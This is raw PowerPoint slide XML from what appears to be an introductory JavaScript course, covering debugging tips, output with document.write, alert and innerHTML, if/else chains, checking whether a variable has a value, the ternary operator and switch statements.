            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30484174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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E1621249-04E7-491C-8CEC-F4143FC72DB3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Finding Errors in JavaScript</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CFCEF670-AA6B-4A03-897E-BDD01A8B3E95}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Control+F5 (force reload), F5 doesn't often perform real reload (but gets some stuff from cache)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>F12 activates developer mode. Learn how to use it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Check that your HTML and CSS are error free!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Use breakpoints and console.log for debugging loops and complex code e.g. F9 steps through code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Test with multiple browsers e.g. Chrome and Firefox and also mobile browsers such as iOS Safari and Android Chrome.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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B16A599B-3C8F-48FF-BEDB-C2E3D2EA28B8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Printing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EF76AF80-53C1-4AAA-B478-1BB186A8B589}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Insert code into the web page at that point:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>document.write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>"text"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>document.writeln</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>"text"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) // added new line</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A dialog window (not recommended)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>"text"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Writing HTML (recommended)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>document.getElementById</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>myid</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>")</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>.innerHTML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>"text"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Debugging:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>console.log</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>"text</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AE5EC35D-0A20-4B31-950B-D3D8CD68EA7C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="274638"/>
            <a:ext cx="10972800" cy="706090"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>if – else if - else</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{280E3050-ABFD-431E-9331-B72E7E76BF9C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1166018"/>
            <a:ext cx="10972800" cy="5417344"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Syntax:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>   </a:t>
            </a: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condition</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executed if condition true</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a: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condition</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executed if condition true and none of the above was true */</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>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executed if none of above was true</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p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1"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 &lt;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marL="400050" lvl="1" indent="0">
              <a:buNone/>
            </a:pP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alert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"Nobody can be that young!"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0">
              <a:buNone/>
            </a:pP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 &lt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>10</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0">
              <a:buNone/>
            </a:pP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alert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"You're still a child."</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0">
              <a:buNone/>
            </a:pP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marL="400050" lvl="1" indent="0">
              <a:buNone/>
            </a:pP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alert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"You old fart!"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>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61A86C9E-6CEB-43BF-900E-AD6F7A5FCCC7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Checking If Variable Has a Value</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40963" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DC57A880-2D23-449F-8017-2909144FD4F5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4983162"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// easier, common idiom among JS programmers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// but be careful if v is Number zero etc.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" sz="1800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0"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v</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v has a value</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v does not have a value</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a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" sz="1800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// more complex, but functions pretty much the same and is more reliable!</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>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v</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undefined</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> &amp;&amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>v</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null</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v has a value</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v does not have a value</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4B568E4B-28B5-461F-9586-765B775E8301}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Ternary operator ? or Conditional Expression</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9EEE62F1-CB54-4C78-8EDF-07FD58F315D7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">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Syntax:</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condition</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true_choice</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false_choice</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Is same as:</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condition</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true_choice</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else</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false_choice</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Example:</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var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absX</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&lt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0</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would be same as</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&lt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0</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absX</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else</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absX</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8BF232DF-C7A6-4F3B-9367-314F6B7AB981}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>switch case</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6DC795B0-7567-4E15-9FFB-7F34425A9BFD}"/>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dirty="0"/>
              <a:t>Syntax:</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switch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variable</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caseA</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process </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>caseA</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reached if none of above was true */</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p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>You can always replace switch case with if - else if - else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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1D8B80D3-9B29-4CE0-99C6-64940EEAB4B3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>switch case example</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44035" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7AC815B2-250A-4CC0-A302-8D9F6F797A95}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1412776"/>
            <a:ext cx="10972800" cy="5256584"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
